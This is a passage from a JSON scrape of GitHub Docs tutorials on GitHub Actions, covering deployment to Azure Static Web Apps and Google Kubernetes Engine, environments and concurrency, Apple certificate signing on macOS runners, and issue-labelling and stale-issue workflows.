        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Deploy web app to Azure Static Web Apps\n\nenv:\n  APP_LOCATION: \"/\" # location of your client code\n  API_LOCATION: \"api\" # location of your api source code - optional\n  OUTPUT_LOCATION: \"build\" # location of client code build output\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    types: [opened, synchronize, reopened, closed]\n    branches:\n      - main\n\npermissions:\n  issues: write\n  contents: read\n  pull-requests: write\n\njobs:\n  build_and_deploy:\n    if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')\n    runs-on: ubuntu-latest\n    name: Build and Deploy\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          submodules: true\n      - name: Build And Deploy\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}\n          repo_token: ${{ secrets.GITHUB_TOKEN }}\n          action: \"upload\"\n          app_location: ${{ env.APP_LOCATION }}\n          api_location: ${{ env.API_LOCATION }}\n          output_location: ${{ env.OUTPUT_LOCATION }}\n\n  close_pull_request:\n    if: github.event_name == 'pull_request' && github.event.action == 'closed'\n    runs-on: ubuntu-latest\n    name: Close Pull Request\n    steps:\n      - name: Close Pull Request\n        uses: Azure/static-web-apps-deploy@1a947af9992250f3bc2e68ad0754c0b0c11566c9\n        with:\n          azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}\n          action: \"close\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-staticwebapp.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/static-web-apps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build a containerized application, push it to Google Container Registry (GCR), and deploy it to Google Kubernetes Engine (GKE) when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "GKE is a managed Kubernetes cluster service from Google Cloud that can host your containerized workloads in the cloud or in your own datacenter. For more information, seeGoogle Kubernetes Engine."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before you proceed with creating the workflow, you will need to complete the following steps for your Kubernetes project. This guide assumes the root of your project already has aDockerfileand a Kubernetes Deployment configuration file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating a GKE cluster"
      },
      {
        "type": "paragraph",
        "text": "To create the GKE cluster, you will first need to authenticate using thegcloudCLI. For more information on this step, see the following articles:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "gcloud auth login",
          "gcloudCLI",
          "gcloudCLI and Cloud SDK"
        ]
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gcloud container clusters create $GKE_CLUSTER \\\n\t--project=$GKE_PROJECT \\\n\t--zone=$GKE_ZONE"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Enabling the APIs"
      },
      {
        "type": "paragraph",
        "text": "Enable the Kubernetes Engine and Container Registry APIs. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gcloud services enable \\\n\tcontainerregistry.googleapis.com \\\n\tcontainer.googleapis.com"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring a service account and storing its credentials"
      },
      {
        "type": "paragraph",
        "text": "This procedure demonstrates how to create the service account for your GKE integration. It explains how to create the account, add roles to it, retrieve its keys, and store them as a base64-encoded encrypted repository secret namedGKE_SA_KEY."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a new service account:Shellgcloud iam service-accounts create $SA_NAMEgcloud iam service-accounts create $SA_NAME",
          "Retrieve the email address of the service account you just created:Shellgcloud iam service-accounts listgcloud iam service-accounts list",
          "Add roles to the service account.NoteApply more restrictive roles to suit your requirements.Shellgcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/container.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/storage.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/container.clusterViewergcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/container.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/storage.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n  --member=serviceAccount:$SA_EMAIL \\\n  --role=roles/container.clusterViewer",
          "Download the JSON keyfile for the service account:Shellgcloud iam service-accounts keys create key.json --iam-account=$SA_EMAILgcloud iam service-accounts keys create key.json --iam-account=$SA_EMAIL",
          "Store the service account key as a secret namedGKE_SA_KEY:Shellexport GKE_SA_KEY=$(cat key.json | base64)export GKE_SA_KEY=$(cat key.json | base64)For more information about how to store a secret, seeUsing secrets in GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Storing your project name"
      },
      {
        "type": "paragraph",
        "text": "Store the name of your project as a secret namedGKE_PROJECT. For more information about how to store a secret, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "(Optional) Configuring kustomize"
      },
      {
        "type": "paragraph",
        "text": "Kustomize is an optional tool used for managing YAML specs. After creating akustomizationfile, the workflow below can be used to dynamically set fields of the image and pipe in the result tokubectl. For more information, seekustomize usage."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "(Optional) Configure a deployment environment"
      },
      {
        "type": "paragraph",
        "text": "Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build a container image and push it to GCR. It then uses the Kubernetes tools (such askubectlandkustomize) to pull the image into the cluster deployment."
      },
      {
        "type": "paragraph",
        "text": "Under theenvkey, change the value ofGKE_CLUSTERto the name of your cluster,GKE_ZONEto your cluster zone,DEPLOYMENT_NAMEto the name of your deployment, andIMAGEto the name of your image."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and Deploy to GKE\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  PROJECT_ID: ${{ secrets.GKE_PROJECT }}\n  GKE_CLUSTER: cluster-1    # Add your cluster name here.\n  GKE_ZONE: us-central1-c   # Add your cluster zone here.\n  DEPLOYMENT_NAME: gke-test # Add your deployment name here.\n  IMAGE: static-site\n\njobs:\n  setup-build-publish-deploy:\n    name: Setup, Build, Publish, and Deploy\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n\n    # Setup gcloud CLI\n    - uses: google-github-actions/setup-gcloud@1bee7de035d65ec5da40a31f8589e240eba8fde5\n      with:\n        service_account_key: ${{ secrets.GKE_SA_KEY }}\n        project_id: ${{ secrets.GKE_PROJECT }}\n\n    # Configure Docker to use the gcloud command-line tool as a credential\n    # helper for authentication\n    - run: |-\n        gcloud --quiet auth configure-docker\n\n    # Get the GKE credentials so we can deploy to the cluster\n    - uses: google-github-actions/get-gke-credentials@db150f2cc60d1716e61922b832eae71d2a45938f\n      with:\n        cluster_name: ${{ env.GKE_CLUSTER }}\n        location: ${{ env.GKE_ZONE }}\n        credentials: ${{ secrets.GKE_SA_KEY }}\n\n    # Build the Docker image\n    - name: Build\n      run: |-\n        docker build \\\n          --tag \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\" \\\n          --build-arg GITHUB_SHA=\"$GITHUB_SHA\" \\\n          --build-arg GITHUB_REF=\"$GITHUB_REF\" \\\n          .\n\n    # Push the Docker image to Google Container Registry\n    - name: Publish\n      run: |-\n        docker push \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\"\n\n    # Set up kustomize\n    - name: Set up Kustomize\n      run: |-\n        curl -sfLo kustomize https://github.com/kubernetes-sigs/kustomize/releases/download/v3.1.0/kustomize_3.1.0_linux_amd64\n        chmod u+x ./kustomize\n\n    # Deploy the Docker image to the GKE cluster\n    - name: Deploy\n      run: |-\n        ./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\n        ./kustomize build . | kubectl apply -f -\n        kubectl rollout status deployment/$DEPLOYMENT_NAME\n        kubectl get services -o wide"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "For more information on the tools used in these examples, see the following documentation:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the full workflow template, see the\"Build and Deploy to GKE\" workflow.",
          "The Kubernetes YAML customization engine:Kustomize.",
          "Deploying a containerized web applicationin the Google Kubernetes Engine documentation."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-with-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions offers features that let you control deployments. You can:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Trigger workflows with a variety of events.",
          "Configure environments to set rules before a job can proceed and to limit access to secrets.",
          "Use concurrency to control the number of deployments running at a time."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information about continuous deployment, seeAbout continuous deployment with GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with the syntax for GitHub Actions. For more information, seeWriting workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Triggering your deployment"
      },
      {
        "type": "paragraph",
        "text": "You can use a variety of events to trigger your deployment workflow. Some of the most common are:pull_request,push, andworkflow_dispatch."
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the following triggers runs whenever:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "There is a push to themainbranch.",
          "A pull request targeting themainbranch is opened, synchronized, or reopened.",
          "Someone manually triggers it."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n  workflow_dispatch:"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using environments"
      },
      {
        "type": "paragraph",
        "text": "Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using concurrency"
      },
      {
        "type": "paragraph",
        "text": "Concurrency ensures that only a single job or workflow using the same concurrency group will run at a time. You can use concurrency so that an environment has a maximum of one deployment in progress and one deployment pending at a time. For more information about concurrency, seeControl the concurrency of workflows and jobs."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "concurrencyandenvironmentare not connected. The concurrency value can be any string; it does not need to be an environment name. Additionally, if another workflow uses the same environment but does not specify concurrency, that workflow will not be subject to any concurrency rules."
      },
      {
        "type": "paragraph",
        "text": "For example, when the following workflow runs, it will be paused with the statuspendingif any job or workflow that uses theproductionconcurrency group is in progress. It will also cancel any job or workflow that uses theproductionconcurrency group and has the statuspending. This means that there will be a maximum of one running and one pending job or workflow in that uses theproductionconcurrency group."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Deployment\n\nconcurrency: production\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps"
      },
      {
        "type": "paragraph",
        "text": "You can also specify concurrency at the job level. This will allow other jobs in the workflow to proceed even if the concurrent job ispending."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    concurrency: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps"
      },
      {
        "type": "paragraph",
        "text": "You can also usecancel-in-progressto cancel any currently running job or workflow in the same concurrency group."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Deployment\n\nconcurrency:\n  group: production\n  cancel-in-progress: true\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps"
      },
      {
        "type": "paragraph",
        "text": "For guidance on writing deployment-specific steps, seeFinding deployment examples."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing deployment history"
      },
      {
        "type": "paragraph",
        "text": "When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. For more information about viewing deployments to environments, seeViewing deployment history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring workflow runs"
      },
      {
        "type": "paragraph",
        "text": "Every workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug deployments. For more information see,Using the visualization graph."
      },
      {
        "type": "paragraph",
        "text": "You can also view the logs of each workflow run and the history of workflow runs. For more information, seeViewing workflow run history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Tracking deployments through apps"
      },
      {
        "type": "paragraph",
        "text": "If your personal account or organization on GitHub is integrated with Microsoft Teams or Slack, you can track deployments that use environments through Microsoft Teams or Slack. For example, you can receive notifications through the app when a deployment is pending approval, when a deployment is approved, or when the deployment status changes. For more information about integrating Microsoft Teams or Slack, seeFeatured GitHub integrations."
      },
      {
        "type": "paragraph",
        "text": "You can also build an app that uses deployment and deployment status webhooks to track deployments. When a workflow job that references an environment runs, it creates a deployment object with theenvironmentproperty set to the name of your environment. As the workflow progresses, it also creates deployment status objects with theenvironmentproperty set to the name of your environment, theenvironment_urlproperty set to the URL for environment (if specified in the workflow), and thestateproperty set to the status of the job. For more information, seeGitHub Apps documentationandWebhook events and payloads."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing a runner"
      },
      {
        "type": "paragraph",
        "text": "You can run your deployment workflow on GitHub-hosted runners or on self-hosted runners. Traffic from GitHub-hosted runners can come from awide range of network addresses. If you are deploying to an internal environment and your company restricts external traffic into private networks, GitHub Actions workflows running on GitHub-hosted runners may not be able to communicate with your internal services or resources. To overcome this, you can host your own runners. For more information, seeAbout self-hosted runnersandUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Displaying a status badge"
      },
      {
        "type": "paragraph",
        "text": "You can use a status badge to display the status of your deployment workflow. A status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in theREADME.mdfile of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using thebranchandeventquery parameters in the URL."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAdding a workflow status badge."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Finding deployment examples"
      },
      {
        "type": "paragraph",
        "text": "This article demonstrated features of GitHub Actions that you can add to your deployment workflows."
      },
      {
        "type": "paragraph",
        "text": "GitHub offers deployment workflow templates for several popular services, such as Azure Web App. To learn how to get started using a workflow template, seeUsing workflow templatesorbrowse the full list of deployment workflow templates. You can also check out our more detailed guides for specific deployment workflows, such asDeploying Node.js to Azure App Service."
      },
      {
        "type": "paragraph",
        "text": "Many service providers also offer actions on GitHub Marketplace for deploying to their service. For the full list, seeGitHub Marketplace."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to add a step to your continuous integration (CI) workflow that installs an Apple code signing certificate and provisioning profile on GitHub Actions runners. This will allow you to sign your Xcode apps for publishing to the Apple App Store, or distributing it to test groups."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Writing workflows",
          "Workflow syntax for GitHub Actions"
        ]
      },
      {
        "type": "paragraph",
        "text": "You should have an understanding of Xcode app building and signing. For more information, see theApple developer documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating secrets for your certificate and provisioning profile"
      },
      {
        "type": "paragraph",
        "text": "The signing process involves storing certificates and provisioning profiles, transferring them to the runner, importing them to the runner's keychain, and using them in your build."
      },
      {
        "type": "paragraph",
        "text": "To use your certificate and provisioning profile on a runner, we strongly recommend that you use GitHub secrets. For more information on creating secrets and using them in a workflow, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Create secrets in your repository or organization for the following items:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Your Apple signing certificate.This is yourp12certificate file. For more information on exporting your signing certificate from Xcode, see theXcode documentation.You should convert your certificate to Base64 when saving it as a secret. In this example, the secret is namedBUILD_CERTIFICATE_BASE64.Use the following command to convert your certificate to Base64 and copy it to your clipboard:base64 -i BUILD_CERTIFICATE.p12 | pbcopy",
          "This is yourp12certificate file. For more information on exporting your signing certificate from Xcode, see theXcode documentation.",
          "You should convert your certificate to Base64 when saving it as a secret. In this example, the secret is namedBUILD_CERTIFICATE_BASE64.",
          "Use the following command to convert your certificate to Base64 and copy it to your clipboard:base64 -i BUILD_CERTIFICATE.p12 | pbcopy",
          "The password for your Apple signing certificate.In this example, the secret is namedP12_PASSWORD.",
          "In this example, the secret is namedP12_PASSWORD.",
          "Your Apple provisioning profile.For more information on exporting your provisioning profile from Xcode, see theXcode documentation.You should convert your provisioning profile to Base64 when saving it as a secret. In this example, the secret is namedBUILD_PROVISION_PROFILE_BASE64.Use the following command to convert your provisioning profile to Base64 and copy it to your clipboard:base64 -i PROVISIONING_PROFILE.mobileprovision | pbcopy",
          "For more information on exporting your provisioning profile from Xcode, see theXcode documentation.",
          "You should convert your provisioning profile to Base64 when saving it as a secret. In this example, the secret is namedBUILD_PROVISION_PROFILE_BASE64.",
          "Use the following command to convert your provisioning profile to Base64 and copy it to your clipboard:base64 -i PROVISIONING_PROFILE.mobileprovision | pbcopy",
          "A keychain password.A new keychain will be created on the runner, so the password for the new keychain can be any new random string. In this example, the secret is namedKEYCHAIN_PASSWORD.",
          "A new keychain will be created on the runner, so the password for the new keychain can be any new random string. In this example, the secret is namedKEYCHAIN_PASSWORD."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Add a step to your workflow"
      },
      {
        "type": "paragraph",
        "text": "This example workflow includes a step that imports the Apple certificate and provisioning profile from the GitHub secrets, and installs them on the runner."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: App build\non: push\n\njobs:\n  build_with_signing:\n    runs-on: macos-latest\n\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      - name: Install the Apple certificate and provisioning profile\n        env:\n          BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }}\n          P12_PASSWORD: ${{ secrets.P12_PASSWORD }}\n          BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }}\n          KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }}\n        run: |\n          # create variables\n          CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12\n          PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision\n          KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db\n\n          # import certificate and provisioning profile from secrets\n          echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH\n          echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH\n\n          # create temporary keychain\n          security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security set-keychain-settings -lut 21600 $KEYCHAIN_PATH\n          security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n\n          # import certificate to keychain\n          security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH\n          security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security list-keychain -d user -s $KEYCHAIN_PATH\n\n          # apply provisioning profile\n          mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles\n          cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles\n      - name: Build app\n          # ..."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "For iOS build targets, your provisioning profile should have the extension.mobileprovision. For macOS build targets, the extension should be.provisionprofile. The example workflow above should be updated to reflect your target platform."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Required clean-up on self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are isolated virtual machines that are automatically destroyed at the end of the job execution. This means that the certificates and provisioning profile used on the runner during the job will be destroyed with the runner when the job is completed."
      },
      {
        "type": "paragraph",
        "text": "On self-hosted runners, the$RUNNER_TEMPdirectory is cleaned up at the end of the job execution, but the keychain and provisioning profile might still exist on the runner."
      },
      {
        "type": "paragraph",
        "text": "If you use self-hosted runners, you should add a final step to your workflow to help ensure that these sensitive files are deleted at the end of the job. The workflow step shown below is an example of how to do this."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Clean up keychain and provisioning profile\n  if: ${{ always() }}\n  run: |\n    security delete-keychain $RUNNER_TEMP/app-signing.keychain-db\n    rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/adding-labels-to-issues",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use the GitHub CLI in a workflow to label newly opened or reopened issues. For example, you can add thetriagelabel every time an issue is opened or reopened. Then, you can see all issues that need to be triaged by filtering for issues with thetriagelabel."
      },
      {
        "type": "paragraph",
        "text": "The GitHub CLI allows you to easily use the GitHub API in a workflow."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses the GitHub CLI. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAMLname: Label issues\non:\n  issues:\n    types:\n      - reopened\n      - opened\njobs:\n  label_issues:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - run: gh issue edit \"$NUMBER\" --add-label \"$LABELS\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          GH_REPO: ${{ github.repository }}\n          NUMBER: ${{ github.event.issue.number }}\n          LABELS: triagename:Labelissueson:issues:types:-reopened-openedjobs:label_issues:runs-on:ubuntu-latestpermissions:issues:writesteps:-run:ghissueedit\"$NUMBER\"--add-label\"$LABELS\"env:GH_TOKEN:${{secrets.GITHUB_TOKEN}}GH_REPO:${{github.repository}}NUMBER:${{github.event.issue.number}}LABELS:triage",
          "Customize theenvvalues in your workflow file:TheGH_TOKEN,GH_REPO, andNUMBERvalues are automatically set using thegithubandsecretscontexts. You do not need to change these.Change the value forLABELSto the list of labels that you want to add to the issue. The label(s) must exist for your repository. Separate multiple labels with commas. For example,help wanted,good first issue. For more information about labels, seeManaging labels.",
          "TheGH_TOKEN,GH_REPO, andNUMBERvalues are automatically set using thegithubandsecretscontexts. You do not need to change these.",
          "Change the value forLABELSto the list of labels that you want to add to the issue. The label(s) must exist for your repository. Separate multiple labels with commas. For example,help wanted,good first issue. For more information about labels, seeManaging labels.",
          "Commit your workflow file to the default branch of your repository. For more information, seeCreating new files."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing the workflow"
      },
      {
        "type": "paragraph",
        "text": "Every time an issue in your repository is opened or reopened, this workflow will add the labels that you specified to the issue."
      },
      {
        "type": "paragraph",
        "text": "Test out your workflow by creating an issue in your repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an issue in your repository. For more information, seeCreating an issue.",
          "To see the workflow run that was triggered by creating the issue, view the history of your workflow runs. For more information, seeViewing workflow run history.",
          "When the workflow completes, the issue that you created should have the specified labels added."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn more about additional things you can do with the GitHub CLI, see theGitHub CLI manual.",
          "To learn more about different events that can trigger your workflow, seeEvents that trigger workflows.",
          "Search GitHubfor examples of workflows usinggh issue edit."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/project-management/closing-inactive-issues",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This tutorial demonstrates how to use theactions/staleactionto comment on and close issues that have been inactive for a certain period of time. For example, you can comment if an issue has been inactive for 30 days to prompt participants to take action. Then, if no additional activity occurs after 14 days, you can close the issue."
      },
      {
        "type": "paragraph",
        "text": "In the tutorial, you will first make a workflow file that uses theactions/staleaction. Then, you will customize the workflow to suit your needs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Choose a repository where you want to apply this project management workflow. You can use an existing repository that you have write access to, or you can create a new repository. For more information about creating a repository, seeCreating a new repository.",
          "In your repository, create a file called.github/workflows/YOUR_WORKFLOW.yml, replacingYOUR_WORKFLOWwith a name of your choice. This is a workflow file. For more information about creating new files on GitHub, seeCreating new files.",
          "Copy the following YAML contents into your workflow file.YAMLname: Close inactive issues\non:\n  schedule:\n    - cron: \"30 1 * * *\"\n\njobs:\n  close-issues:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n      pull-requests: write\n    steps:\n      - uses: actions/stale@v9\n        with:\n          days-before-issue-stale: 30\n          days-before-issue-close: 14\n          stale-issue-label: \"stale\"\n          stale-issue-message: \"This issue is stale because it has been open for 30 days with no activity.\"\n          close-issue-message: \"This issue was closed because it has been inactive for 14 days since being marked as stale.\"\n          days-before-pr-stale: -1\n          days-before-pr-close: -1\n          repo-token: ${{ secrets.GITHUB_TOKEN }}name:Closeinactiveissueson:schedule:-cron:\"30 1 * * *\"jobs:close-issues:runs-on:ubuntu-latestpermissions:issues:writepull-requests:writesteps:-uses:actions/stale@v9with:days-before-issue-stale:30days-before-issue-close:14stale-issue-label:\"stale\"stale-issue-message:\"This issue is stale because it has been open for 30 days with no activity.\"close-issue-message:\"This issue was closed because it has been inactive for 14 days since being marked as stale.\"days-before-pr-stale:-1days-before-pr-close:-1repo-token:${{secrets.GITHUB_TOKEN}}",
